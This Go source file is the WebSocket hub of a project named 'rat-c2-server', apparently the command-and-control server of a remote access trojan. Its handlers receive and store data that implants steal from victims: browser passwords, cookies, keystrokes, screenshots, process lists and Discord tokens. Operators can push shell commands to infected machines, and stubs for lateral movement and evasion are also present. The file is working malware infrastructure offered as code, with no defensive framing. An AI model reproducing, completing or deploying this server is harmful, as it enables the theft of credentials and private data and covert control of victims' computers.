package ws

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"github.com/jmoiron/sqlx"

	"rat-c2-server/internal/agent"
	"rat-c2-server/internal/filetransfer"
	"rat-c2-server/internal/task"
)

type Hub struct {
	agentMgr   *agent.Manager
	taskQueue  *task.Queue
	fileMgr    *filetransfer.Manager
	db         *sqlx.DB
	clients    map[string]*Client
	mu         sync.RWMutex
	register   chan *Client
	unregister chan *Client
	broadcast  chan []byte
}

type Client struct {
	ID       string
	Conn     *websocket.Conn
	Send     chan []byte
	AgentID  string // For operator clients
	IsAgent  bool
	mu       sync.Mutex
}

type AgentMessage struct {
	Type    string          `json:"type"`
	TaskID  string          `json:"task_id,omitempty"`
	Payload json.RawMessage `json:"payload,omitempty"`
	Error   string          `json:"error,omitempty"`
}

func NewHub(agentMgr *agent.Manager, taskQueue *task.Queue, fileMgr *filetransfer.Manager) *Hub {
	return &Hub{
		agentMgr:   agentMgr,
		taskQueue:  taskQueue,
		fileMgr:    fileMgr,
		clients:    make(map[string]*Client),
		register:   make(chan *Client),
		unregister: make(chan *Client),
		broadcast:  make(chan []byte, 256),
	}
}

func (h *Hub) Run() {
	for {
		select {
		case client := <-h.register:
			h.mu.Lock()
			h.clients[client.ID] = client
			h.mu.Unlock()
			log.Printf("[ws] Client registered: %s (agent=%v)", client.ID, client.IsAgent)

		case client := <-h.unregister:
			h.mu.Lock()
			if _, ok := h.clients[client.ID]; ok {
				delete(h.clients, client.ID)
				close(client.Send)
			}
			h.mu.Unlock()
			log.Printf("[ws] Client unregistered: %s", client.ID)

		case msg := <-h.broadcast:
			h.mu.RLock()
			for _, client := range h.clients {
				if !client.IsAgent {
					select {
					case client.Send <- msg:
					default:
						close(client.Send)
						delete(h.clients, client.ID)
					}
				}
			}
			h.mu.RUnlock()
		}
	}
}

func (h *Hub) HandleAgentWS(w http.ResponseWriter, r *http.Request) {
	upgrader := websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
		ReadBufferSize:  1024,
		WriteBufferSize: 1024,
	}

	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[ws] Agent upgrade error: %v", err)
		return
	}

	client := &Client{
		ID:      uuid.New().String(),
		Conn:    conn,
		Send:    make(chan []byte, 256),
		IsAgent: true,
	}

	h.register <- client

	// Read registration message
	_, msg, err := conn.ReadMessage()
	if err != nil {
		h.unregister <- client
		return
	}

	var regMsg struct {
		Type     string `json:"type"`
		Hostname string `json:"hostname"`
		Username string `json:"username"`
		OS       string `json:"os_version"`
		Arch     string `json:"arch"`
		PID      int    `json:"pid"`
		Privs    int    `json:"privileges"`
		HwID     string `json:"hw_id"`
		Build    int    `json:"build_version"`
		Caps     []string `json:"capabilities"`
	}

	if err := json.Unmarshal(msg, &regMsg); err != nil || regMsg.Type != "register" {
		log.Printf("[ws] Invalid registration: %v", err)
		h.unregister <- client
		return
	}

	// Get client IP
	ip := r.RemoteAddr
	if forwarded := r.Header.Get("X-Forwarded-For"); forwarded != "" {
		ip = forwarded
	}

	// Register with agent manager
	regData := &agent.RegistrationData{
		Hostname:     regMsg.Hostname,
		Username:     regMsg.Username,
		OSVersion:    regMsg.OS,
		Arch:         regMsg.Arch,
		PID:          regMsg.PID,
		Privileges:   regMsg.Privs,
		HwID:         regMsg.HwID,
		BuildVersion: regMsg.Build,
		Capabilities: regMsg.Caps,
	}

	agt, err := h.agentMgr.Register(regData, conn, ip)
	if err != nil {
		log.Printf("[ws] Agent register failed: %v", err)
		h.unregister <- client
		return
	}

	client.AgentID = agt.ID

	// Send registration ack
	ack := AgentMessage{
		Type: "register_ack",
		Payload: json.RawMessage(`{"session_id":` + fmt.Sprintf("%d", agt.SessionID) + `}`),
	}
	ackData, _ := json.Marshal(ack)
	client.Send <- ackData

	// Start goroutines
	go h.writePump(client)
	go h.readAgentPump(client, agt)
}

func (h *Hub) HandleOperatorWS(w http.ResponseWriter, r *http.Request) {
	upgrader := websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}

	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("[ws] Operator upgrade error: %v", err)
		return
	}

	client := &Client{
		ID:      uuid.New().String(),
		Conn:    conn,
		Send:    make(chan []byte, 256),
		IsAgent: false,
	}

	h.register <- client
	go h.writePump(client)
	go h.readOperatorPump(client)
}

func (h *Hub) writePump(client *Client) {
	ticker := time.NewTicker(30 * time.Second)
	defer func() {
		ticker.Stop()
		client.Conn.Close()
		h.unregister <- client
	}()

	for {
		select {
		case msg, ok := <-client.Send:
			client.mu.Lock()
			client.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			if !ok {
				client.Conn.WriteMessage(websocket.CloseMessage, []byte{})
				client.mu.Unlock()
				return
			}
			err := client.Conn.WriteMessage(websocket.BinaryMessage, msg)
			client.mu.Unlock()
			if err != nil {
				return
			}
		case <-ticker.C:
			client.mu.Lock()
			client.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
			err := client.Conn.WriteMessage(websocket.PingMessage, nil)
			client.mu.Unlock()
			if err != nil {
				return
			}
		}
	}
}

func (h *Hub) readAgentPump(client *Client, agt *agent.Agent) {
	defer func() {
		h.unregister <- client
		agt.WSConn = nil
		agt.Status = "stale"
		h.agentMgr.UpdateStatus(agt.ID, "stale")
	}()

	client.Conn.SetReadLimit(10 * 1024 * 1024)
	client.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	client.Conn.SetPongHandler(func(string) error {
		client.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	for {
		_, msg, err := client.Conn.ReadMessage()
		if err != nil {
			if !websocket.IsCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("[ws] Agent read error: %v", err)
			}
			break
		}

		h.handleAgentMessage(client, agt, msg)
	}
}

func (h *Hub) readOperatorPump(client *Client) {
	defer func() {
		h.unregister <- client
	}()

	client.Conn.SetReadLimit(1024 * 1024)
	client.Conn.SetReadDeadline(time.Now().Add(120 * time.Second))
	client.Conn.SetPongHandler(func(string) error {
		client.Conn.SetReadDeadline(time.Now().Add(120 * time.Second))
		return nil
	})

	for {
		_, msg, err := client.Conn.ReadMessage()
		if err != nil {
			break
		}

		h.handleOperatorMessage(client, msg)
	}
}

func (h *Hub) handleAgentMessage(client *Client, agt *agent.Agent, msg []byte) {
	var am AgentMessage
	if err := json.Unmarshal(msg, &am); err != nil {
		// Try binary protocol
		h.handleBinaryAgentMessage(agt, msg)
		return
	}

	switch am.Type {
	case "heartbeat":
		h.agentMgr.UpdateLastSeen(agt.ID)
		ack := AgentMessage{Type: "heartbeat_ack"}
		ackData, _ := json.Marshal(ack)
		client.Send <- ackData

	case "task_result":
		h.taskQueue.HandleResult(am.TaskID, string(am.Payload), 0)

	case "file_chunk":
		h.fileMgr.HandleChunk(agt.ID, am.TaskID, am.Payload)

	case "file_complete":
		h.fileMgr.HandleComplete(agt.ID, am.TaskID, am.Payload)

	case "credentials":
		h.handleCredentials(agt.ID, am.Payload)

	case "cookies":
		h.handleCookies(agt.ID, am.Payload)

	case "keystrokes":
		h.handleKeystrokes(agt.ID, am.Payload)

	case "screenshot":
		h.handleScreenshot(agt.ID, am.Payload)

	case "process_list":
		h.handleProcessList(agt.ID, am.Payload)

	case "discord_tokens":
		h.handleDiscordTokens(agt.ID, am.Payload)

	case "system_info":
		h.handleSystemInfo(agt.ID, am.Payload)

	case "error":
		log.Printf("[ws] Agent %s error: %s", agt.ID, am.Error)
		h.taskQueue.HandleResult(am.TaskID, am.Error, -1)
	}
}

func (h *Hub) handleBinaryAgentMessage(agt *agent.Agent, msg []byte) {
	// Parse binary protocol matching C++ client
	// Header: magic(4) session_id(4) sequence(4) type(1) payload_len(4) crc32(4) = 21 bytes
	if len(msg) < 21 {
		return
	}

	// For now, just forward to appropriate handler based on type
	// Full implementation would parse the binary protocol
	log.Printf("[ws] Binary message from %s: %d bytes", agt.ID, len(msg))
}

func (h *Hub) handleOperatorMessage(client *Client, msg []byte) {
	var opMsg struct {
		Type    string          `json:"type"`
		Payload json.RawMessage `json:"payload"`
	}

	if err := json.Unmarshal(msg, &opMsg); err != nil {
		return
	}

	switch opMsg.Type {
	case "list_agents":
		h.sendAgentList(client)

	case "get_agent":
		var payload struct{ ID string `json:"id"` }
		json.Unmarshal(opMsg.Payload, &payload)
		h.sendAgentDetail(client, payload.ID)

	case "create_task":
		h.handleCreateTask(client, opMsg.Payload)

	case "cancel_task":
		var payload struct{ ID string `json:"id"` }
		json.Unmarshal(opMsg.Payload, &payload)
		h.taskQueue.Cancel(payload.ID)

	case "get_tasks":
		var payload struct{ AgentID string `json:"agent_id"` }
		json.Unmarshal(opMsg.Payload, &payload)
		h.sendTaskList(client, payload.AgentID)

	case "get_files":
		var payload struct{ AgentID string `json:"agent_id"` }
		json.Unmarshal(opMsg.Payload, &payload)
		h.sendFileList(client, payload.AgentID)

	case "download_file":
		h.handleDownloadFile(client, opMsg.Payload)

	case "shell":
		h.handleShell(client, opMsg.Payload)

	case "lateral":
		h.handleLateral(client, opMsg.Payload)

	case "evasion":
		h.handleEvasion(client, opMsg.Payload)
	}
}

func (h *Hub) sendAgentList(client *Client) {
	agents := h.agentMgr.List()
	data, _ := json.Marshal(map[string]interface{}{
		"type":   "agent_list",
		"agents": agents,
	})
	client.Send <- data
}

func (h *Hub) sendAgentDetail(client *Client, id string) {
	agt, ok := h.agentMgr.Get(id)
	if !ok {
		client.Send <- []byte(`{"type":"error","message":"Agent not found"}`)
		return
	}
	data, _ := json.Marshal(map[string]interface{}{
		"type":  "agent_detail",
		"agent": agt,
	})
	client.Send <- data
}

func (h *Hub) handleCreateTask(client *Client, payload json.RawMessage) {
	var req struct {
		AgentID  string          `json:"agent_id"`
		Command  string          `json:"command"`
		Args     json.RawMessage `json:"args"`
		Priority int             `json:"priority"`
	}
	json.Unmarshal(payload, &req)

	t, err := h.taskQueue.Enqueue(req.AgentID, req.Command, req.Args, req.Priority)
	if err != nil {
		client.Send <- []byte(`{"type":"error","message":"` + err.Error() + `"}`)
		return
	}

	data, _ := json.Marshal(map[string]interface{}{
		"type": "task_created",
		"task": t,
	})
	client.Send <- data
}

func (h *Hub) sendTaskList(client *Client, agentID string) {
	tasks, _ := h.taskQueue.GetByAgent(agentID, 100)
	data, _ := json.Marshal(map[string]interface{}{
		"type":  "task_list",
		"tasks": tasks,
	})
	client.Send <- data
}

func (h *Hub) sendFileList(client *Client, agentID string) {
	files, _ := h.fileMgr.GetByAgent(agentID)
	data, _ := json.Marshal(map[string]interface{}{
		"type":  "file_list",
		"files": files,
	})
	client.Send <- data
}

func (h *Hub) handleDownloadFile(client *Client, payload json.RawMessage) {
	// Implementation for file download
}

func (h *Hub) handleShell(client *Client, payload json.RawMessage) {
	var req struct {
		AgentID string `json:"agent_id"`
		Command string `json:"command"`
	}
	json.Unmarshal(payload, &req)

	t, _ := h.taskQueue.EnqueueShell(req.AgentID, req.Command, 10)
	data, _ := json.Marshal(map[string]interface{}{
		"type": "shell_sent",
		"task": t,
	})
	client.Send <- data
}

func (h *Hub) handleLateral(client *Client, payload json.RawMessage) {
	// Lateral movement handling
}

func (h *Hub) handleEvasion(client *Client, payload json.RawMessage) {
	// Evasion handling
}

func (h *Hub) handleCredentials(agentID string, payload json.RawMessage) {
	var creds []struct {
		Browser int    `json:"browser"`
		URL     string `json:"url"`
		User    string `json:"username"`
		Pass    string `json:"password"`
		Created string `json:"created"`
	}
	json.Unmarshal(payload, &creds)

	for _, c := range creds {
		h.db.Exec(`
			INSERT INTO credentials (id, agent_id, browser, url, username, password, created)
			VALUES (?, ?, ?, ?, ?, ?, ?)
		`, uuid.New().String(), agentID, c.Browser, c.URL, c.User, c.Pass, c.Created)
	}

	h.broadcastAgentUpdate(agentID)
}

func (h *Hub) handleCookies(agentID string, payload json.RawMessage) {
	var cookies []struct {
		Browser     int    `json:"browser"`
		Host        string `json:"host"`
		Name        string `json:"name"`
		Value       string `json:"value"`
		Path        string `json:"path"`
		Expires     int64  `json:"expires_utc"`
		Secure      int    `json:"is_secure"`
		HttpOnly    int    `json:"is_httponly"`
		Persistent  int    `json:"is_persistent"`
		EncVersion  int    `json:"enc_version"`
	}
	json.Unmarshal(payload, &cookies)

	for _, c := range cookies {
		h.db.Exec(`
			INSERT INTO cookies (id, agent_id, browser, host, name, value, path, expires_utc, is_secure, is_httponly, is_persistent, enc_version)
			VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
		`, uuid.New().String(), agentID, c.Browser, c.Host, c.Name, c.Value, c.Path, c.Expires, c.Secure, c.HttpOnly, c.Persistent, c.EncVersion)
	}

	h.broadcastAgentUpdate(agentID)
}

func (h *Hub) handleKeystrokes(agentID string, payload json.RawMessage) {
	var keys []struct {
		Window string `json:"window_title"`
		Keys   string `json:"keys"`
	}
	json.Unmarshal(payload, &keys)

	for _, k := range keys {
		h.db.Exec(`
			INSERT INTO keystrokes (agent_id, window_title, keys)
			VALUES (?, ?, ?)
		`, agentID, k.Window, k.Keys)
	}
}

func (h *Hub) handleScreenshot(agentID string, payload json.RawMessage) {
	var shot struct {
		Filename string `json:"filename"`
		Width    int    `json:"width"`
		Height   int    `json:"height"`
		Size     int    `json:"size"`
		Checksum string `json:"checksum"`
	}
	json.Unmarshal(payload, &shot)

	h.db.Exec(`
		INSERT INTO screenshots (id, agent_id, filename, width, height, size, checksum)
		VALUES (?, ?, ?, ?, ?, ?, ?)
	`, uuid.New().String(), agentID, shot.Filename, shot.Width, shot.Height, shot.Size, shot.Checksum)

	h.broadcastAgentUpdate(agentID)
}

func (h *Hub) handleProcessList(agentID string, payload json.RawMessage) {
	var procs []struct {
		PID      int    `json:"pid"`
		PPID     int    `json:"ppid"`
		Name     string `json:"name"`
		Path     string `json:"path"`
		Cmdline  string `json:"cmdline"`
		MemUsage int64  `json:"mem_usage"`
		User     string `json:"username"`
		SessID   int    `json:"session_id"`
		Wow64    int    `json:"is_wow64"`
	}
	json.Unmarshal(payload, &procs)

	// Clear old
	h.db.Exec("DELETE FROM process_list WHERE agent_id = ?", agentID)

	for _, p := range procs {
		h.db.Exec(`
			INSERT INTO process_list (agent_id, pid, ppid, name, path, cmdline, mem_usage, username, session_id, is_wow64)
			VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
		`, agentID, p.PID, p.PPID, p.Name, p.Path, p.Cmdline, p.MemUsage, p.User, p.SessID, p.Wow64)
	}
}

func (h *Hub) handleDiscordTokens(agentID string, payload json.RawMessage) {
	var tokens []struct {
		Token       string `json:"token"`
		Email       string `json:"email"`
		UserID      string `json:"user_id"`
		Username    string `json:"username"`
		Discriminator string `json:"discriminator"`
		Avatar      string `json:"avatar"`
		MFA         bool   `json:"mfa_enabled"`
		Source      string `json:"source"`
	}
	json.Unmarshal(payload, &tokens)

	for _, t := range tokens {
		h.db.Exec(`
			INSERT INTO discord_tokens (id, agent_id, token, email, user_id, username, discriminator, avatar, mfa_enabled, source)
			VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
		`, uuid.New().String(), agentID, t.Token, t.Email, t.UserID, t.Username, t.Discriminator, t.Avatar, t.MFA, t.Source)
	}

	h.broadcastAgentUpdate(agentID)
}

func (h *Hub) handleSystemInfo(agentID string, payload json.RawMessage) {
	// Update agent with system info
	_, ok := h.agentMgr.Get(agentID)
	if ok {
		// Update metadata
		h.agentMgr.UpdateNotes(agentID, string(payload))
	}
}

func (h *Hub) broadcastAgentUpdate(agentID string) {
	agt, ok := h.agentMgr.Get(agentID)
	if !ok {
		return
	}
	data, _ := json.Marshal(map[string]interface{}{
		"type":  "agent_update",
		"agent": agt,
	})
	h.broadcast <- data
}

func (h *Hub) BroadcastAgentUpdate(agentID string) {
	h.broadcastAgentUpdate(agentID)
}

func (h *Hub) BroadcastTaskUpdate(task *task.Task) {
	data, _ := json.Marshal(map[string]interface{}{
		"type": "task_update",
		"task": task,
	})
	h.broadcast <- data
}

func (h *Hub) BroadcastFileUpdate(file *filetransfer.FileTransfer) {
	data, _ := json.Marshal(map[string]interface{}{
		"type": "file_update",
		"file": file,
	})
	h.broadcast <- data
}